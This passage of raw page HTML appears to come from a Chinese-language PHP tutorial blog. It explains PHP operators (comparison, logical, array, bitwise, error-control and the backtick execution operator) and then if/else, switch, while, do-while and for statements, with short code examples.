string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">===</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">!=</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&gt;</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&lt;</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/04/5tbqidLvTrZaRu4.png" alt="phpsf-5.png"></p><h3 id="PHP-逻辑运算符"><a href="#PHP-逻辑运算符" class="headerlink" title="PHP 逻辑运算符"></a>PHP 逻辑运算符</h3><hr><table><thead><tr><th>运算符</th><th>名称</th><th>例子</th><th>结果</th></tr></thead><tbody><tr><td>and</td><td>与</td><td>$x and $y</td><td>如果 $x 和 $y 都为 true，则返回 true。</td></tr><tr><td>or</td><td>或</td><td>$x or $y</td><td>如果 $x 和 $y 至少有一个为 true，则返回 true。</td></tr><tr><td>xor</td><td>异或</td><td>$x xor $y</td><td>如果 $x 和 $y 有且仅有一个为 true，则返回 true。</td></tr><tr><td>&amp;&amp;</td><td>与</td><td>$x &amp;&amp; $y</td><td>如果 $x 和 $y 都为 true，则返回 true。</td></tr><tr><td></td><td></td><td></td><td>或</td></tr><tr><td>!</td><td>非</td><td>!$x</td><td>如果 $x 不为 true，则返回 true。</td></tr></tbody></table><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// --------------------</span><span class="token comment" spellcheck="true">// foo() 根本没机会被调用，被运算符“短路”了</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token boolean">true</span>  <span class="token operator">||</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token keyword">and</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token boolean">true</span>  <span class="token keyword">or</span>  <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// --------------------</span><span class="token comment" spellcheck="true">// "||" 比 "or" 的优先级高</span><span class="token comment" spellcheck="true">// 表达式 (false || true) 的结果被赋给 $e</span><span class="token comment" spellcheck="true">// 等同于：($e = (false || true))</span><span class="token variable">$e</span> <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token operator">||</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 常量 false 被赋给 $f，true 被忽略</span><span class="token comment" spellcheck="true">// 等同于：(($f = false) or true)</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token keyword">or</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// --------------------</span><span class="token comment" spellcheck="true">// "&amp;&amp;" 比 "and" 的优先级高</span><span class="token comment" spellcheck="true">// 表达式 (true &amp;&amp; false) 的结果被赋给 $g</span><span class="token comment" spellcheck="true">// 等同于：($g = (true &amp;&amp; false))</span><span class="token variable">$g</span> <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 常量 true 被赋给 $h，false 被忽略</span><span class="token comment" spellcheck="true">// 等同于：(($h = true) and false)</span><span class="token variable">$h</span> <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token keyword">and</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$h</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/04/CpWzvAMGHs67NoY.png" alt="phpsf-6.png"></p><h3 id="PHP数组运算"><a href="#PHP数组运算" class="headerlink" title="PHP数组运算"></a>PHP数组运算</h3><hr><p>PHP 数组运算符用于比较数组</p><table><thead><tr><th>运算符</th><th>名称</th><th>例子</th><th>结果</th></tr></thead><tbody><tr><td>+</td><td>联合</td><td>$x + $y</td><td>$x 和 $y 的联合（但不覆盖重复的键）</td></tr><tr><td>==</td><td>相等</td><td>$x == $y</td><td>如果 $x 和 $y 拥有相同的键/值对，则返回 true。</td></tr><tr><td>===</td><td>全等</td><td>$x === $y</td><td>如果 $x 和 $y 拥有相同的键/值对，且顺序相同类型相同，则返回 true。</td></tr><tr><td>!=</td><td>不相等</td><td>$x != $y</td><td>如果 $x 不等于 $y，则返回 true。</td></tr><tr><td>&lt;&gt;</td><td>不相等</td><td>$x &lt;&gt; $y</td><td>如果 $x 不等于 $y，则返回 true。</td></tr><tr><td>!==</td><td>不全等</td><td>$x !== $y</td><td>如果 $x 与 $y 完全不同，则返回 true。</td></tr></tbody></table><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// a,b,c,d为键，apple等为值</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"a"</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"b"</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"c"</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">"orange"</span><span class="token punctuation">,</span> <span class="token string">"d"</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">"peach"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token variable">$x</span> <span class="token operator">+</span> <span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $x 与 $y 的联合</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$z</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">==</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">===</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">!=</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">&lt;</span><span class="token operator">&gt;</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/04/qIfvi3RlxFOyN7D.png" alt="phpsf-7.png"></p><h3 id="PHP位运算符"><a href="#PHP位运算符" class="headerlink" title="PHP位运算符"></a>PHP位运算符</h3><hr><table><thead><tr><th>运算符</th><th>名称</th><th>例子</th><th>结果</th></tr></thead><tbody><tr><td>&amp;</td><td>按位与</td><td>$a &amp; $b</td><td>将把 $a 和 $b 中都为 1 的位设为 1。</td></tr><tr><td>|</td><td>按位或</td><td>$a | $b</td><td>将把 $a 和 $b 中任何一个为 1 的位设为 1。</td></tr><tr><td>^</td><td>按位异或</td><td>$a ^ $b</td><td>将把 $a 和 $b 中一个为 1 另一个为 0 的位设为 1。</td></tr><tr><td>~</td><td>按位取反</td><td>~ $a</td><td>将 $a 中为 0 的位设为 1，反之亦然。</td></tr><tr><td>&lt;&lt;</td><td>左移</td><td>$a &lt;&lt; $b</td><td>将 $a 中的位向左移动 $b 次（每一次移动都表示“乘以 2”）。</td></tr><tr><td>&gt;&gt;</td><td>右移</td><td>$a &gt;&gt; $b</td><td>将 $a 中的位向右移动 $b 次（每一次移动都表示“除以 2”）。</td></tr></tbody></table><p><strong>注：</strong> 位移在 PHP 中是数学运算。向任何方向移出去的位都被丢弃。左移时右侧以零填充，符号位被移走意味着正负号不被保留。右移时左侧以符号位填充，意味着正负号被保留。</p><h3 id="PHP错误控制运算符"><a href="#PHP错误控制运算符" class="headerlink" title="PHP错误控制运算符"></a>PHP错误控制运算符</h3><hr><p>PHP 支持一个错误控制运算符：@。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</p><p>如果用 set_error_handler() 设定了自定义的错误处理函数，仍然会被调用，但是此错误处理函数可以（并且也应该）调用 error_reporting()，而该函数在出错语句前有 @ 时将返回 0。</p><p>如果激活了 track_errors 特性，表达式所产生的任何错误信息都被存放在变量 $php_errormsg 中。此变量在每次出错时都会被覆盖，所以如果想用它的话就要尽早检查。</p><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/* Intentional file error */</span><span class="token variable">$my_file</span> <span class="token operator">=</span> @<span class="token function">file</span> <span class="token punctuation">(</span><span class="token string">'non_existent_file'</span><span class="token punctuation">)</span> <span class="token keyword">or</span><span class="token comment" spellcheck="true">// die 函数指定一个错误消息，并退出当前执行语句</span>    <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"Failed opening file: error was '$php_errormsg'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// this works for any expression, not just functions:</span><span class="token variable">$value</span> <span class="token operator">=</span> @<span class="token variable">$cache</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// will not issue a notice if the index $key doesn't exist.</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/04/aVcxQAR6gwj2Ckv.png" alt="phpsf-8.png"></p><p><strong>注：</strong> @ 运算符只对表达式有效。对新手来说一个简单的规则就是：如果能从某处得到值，就能在它前面加上 @ 运算符。例如，可以把它放在变量，函数和 include 调用，常量，等等之前。不能把它放在函数或类的定义之前，也不能用于条件结构例如 if 和 foreach 等。</p><p><strong>警告：</strong> 目前的“@”错误控制运算符前缀甚至使导致脚本终止的严重错误的错误报告也失效。这意味着如果在某个不存在或者敲错了字母的函数调用前用了“@”来抑制错误信息，那脚本会没有任何迹象显示原因而死在那里。</p><h3 id="PHP执行运算符"><a href="#PHP执行运算符" class="headerlink" title="PHP执行运算符"></a>PHP执行运算符</h3><hr><p>PHP 支持一个执行运算符：反引号（``）。PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。</p><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$output</span> <span class="token operator">=</span> `ls <span class="token operator">-</span>al`<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;pre&gt;$output&lt;/pre&gt;"</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/04/JckWSCIhqVDYagZ.png" alt="phpsf-9.png"></p><h2 id="PHP-条件语句"><a href="#PHP-条件语句" class="headerlink" title="PHP 条件语句"></a>PHP 条件语句</h2><hr><p>在 PHP 中，可以使用以下条件语句：</p><ul><li>if 语句：如果指定条件为真，则执行代码</li><li>if…else 语句：如果条件为 true，则执行代码；如果条件为 false，则执行另一端代码</li><li>if…elseif….else 语句：根据两个以上的条件执行不同的代码块</li><li>switch 语句：选择多个代码块之一来执行</li></ul><h3 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h3><p>if 语句用于在指定条件为 true 时执行代码。</p><hr><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span> <span class="token punctuation">{</span>  当条件为 <span class="token boolean">true</span> 时执行的代码<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$t</span><span class="token operator">=</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"H"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$t</span><span class="token operator">&lt;</span><span class="token string">"20"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Have a good day!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/11/qdPafJRVvXBehxE.png" alt="phpif-1.png"></p><h3 id="if…else-语句"><a href="#if…else-语句" class="headerlink" title="if…else 语句"></a>if…else 语句</h3><p>if….else 语句在条件为 true 时执行代码，在条件为 false 时执行另一段代码。</p><hr><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span> <span class="token punctuation">{</span>  条件为 <span class="token boolean">true</span> 时执行的代码<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  条件为 <span class="token boolean">false</span> 时执行的代码<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$t</span><span class="token operator">=</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"H"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$t</span><span class="token operator">&lt;</span><span class="token string">"20"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Have a good day!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Have a good night!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/11/qdPafJRVvXBehxE.png" alt="phpif-2.png"></p><h2 id="if…elseif…else-语句"><a href="#if…elseif…else-语句" class="headerlink" title="if…elseif…else 语句"></a>if…elseif…else 语句</h2><p>if….elseif…else 语句来根据两个以上的条件执行不同的代码。</p><hr><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span> <span class="token punctuation">{</span>  条件为 <span class="token boolean">true</span> 时执行的代码<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span>condition<span class="token punctuation">)</span> <span class="token punctuation">{</span>  条件为 <span class="token boolean">true</span> 时执行的代码<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  条件为 <span class="token boolean">false</span> 时执行的代码<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$t</span><span class="token operator">=</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"H"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$t</span><span class="token operator">&lt;</span><span class="token string">"10"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Have a good morning!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$t</span><span class="token operator">&lt;</span><span class="token string">"20"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Have a good day!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Have a good night!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/11/8k4aDmiHJVCbonI.png" alt="phpif-3.png"></p><h3 id="switch-语句"><a href="#switch-语句" class="headerlink" title="switch 语句"></a>switch 语句</h3><p>使用 Switch 语句可以避免冗长的 if..elseif..else 代码块。</p><hr><h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">switch</span> <span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span> label1<span class="token punctuation">:</span>  expression <span class="token operator">=</span> label1 时执行的代码 <span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> label2<span class="token punctuation">:</span>  expression <span class="token operator">=</span> label2 时执行的代码 <span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>  表达式的值不等于 label1 及 label2 时执行的代码<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/11/2cKlETx7wRdrQBu.png" alt="phpif-3.png"></p><p><strong>工作原理：</strong></p><ol><li>对表达式（通常是变量）进行一次计算</li><li>把表达式的值与结构中 case 的值进行比较</li><li>如果存在匹配，则执行与 case 关联的代码</li><li>代码执行后，break 语句阻止代码跳入下一个 case 中继续执行</li><li>如果没有 case 为真，则使用 default 语句</li></ol><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$favfruit</span><span class="token operator">=</span><span class="token string">"orange"</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$favfruit</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">case</span> <span class="token string">"apple"</span><span class="token punctuation">:</span>     <span class="token keyword">echo</span> <span class="token string">"Your favorite fruit is apple!"</span><span class="token punctuation">;</span>     <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token keyword">case</span> <span class="token string">"banana"</span><span class="token punctuation">:</span>     <span class="token keyword">echo</span> <span class="token string">"Your favorite fruit is banana!"</span><span class="token punctuation">;</span>     <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token keyword">case</span> <span class="token string">"orange"</span><span class="token punctuation">:</span>     <span class="token keyword">echo</span> <span class="token string">"Your favorite fruit is orange!"</span><span class="token punctuation">;</span>     <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token keyword">default</span><span class="token punctuation">:</span>     <span class="token keyword">echo</span> <span class="token string">"Your favorite fruit is neither apple, banana, or orange!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PHP-循环"><a href="#PHP-循环" class="headerlink" title="PHP 循环"></a>PHP 循环</h2><hr><p>在 PHP 中有以下循环语句：</p><ul><li>while - 只要指定条件为真，则循环代码块</li><li>do…while - 先执行一次代码块，然后只要指定条件为真则重复循环</li><li>for - 循环代码块指定次数</li><li>foreach - 遍历数组中的每个元素并循环代码块</li></ul><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>只要指定条件为真，while 循环就会执行代码块</p><hr><h4 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">while</span> <span class="token punctuation">(</span>条件为真<span class="token punctuation">)</span> <span class="token punctuation">{</span>  要执行的代码<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 首先把变量 $x 设置为 1（$x=1）。然后执行 while 循环，只要 $x 小于或等于 5。循环每运行一次，$x 将递增 1</span><span class="token delimiter">&lt;?php</span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"这个数字是：$x &lt;br&gt;"</span><span class="token punctuation">;</span>  <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/12/nRhJ6fYjNtVEAug.png" alt="while.png"></p><h3 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h3><p>do…while 循环首先会执行一次代码块，然后检查条件，如果指定条件为真，则重复循环。</p><hr><h4 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">do</span> <span class="token punctuation">{</span>  要执行的代码<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>条件为真<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 首先把变量 $x 设置为 1（$x=1）。然后，do while 循环输出一段字符串，然后对变量 $x 递增 1。随后对条件进行检查（$x 是否小于或等于 5）。只要 $x 小于或等于 5，循环将会继续运行</span><span class="token delimiter">&lt;?php</span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"这个数字是：$x &lt;br&gt;"</span><span class="token punctuation">;</span>  <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/12/nRhJ6fYjNtVEAug.png" alt="do-while.png"></p><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>指定代码块循环执行的次数</p><hr><h4 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> test counter<span class="token punctuation">;</span> increment counter<span class="token punctuation">)</span> <span class="token punctuation">{</span>  code to be executed<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>参数：</strong></p><ul><li>init counter：变量初始化值</li><li>test counter：: 每次循环开始前求值。如果值为 TRUE，继续循环。如果它的值为 FALSE，循环结束。</li><li>increment counter：增加循环计数器的值</li></ul><h4 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 从 0 循环到 10，并输出每次循环的结果</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"数字是：$x &lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token 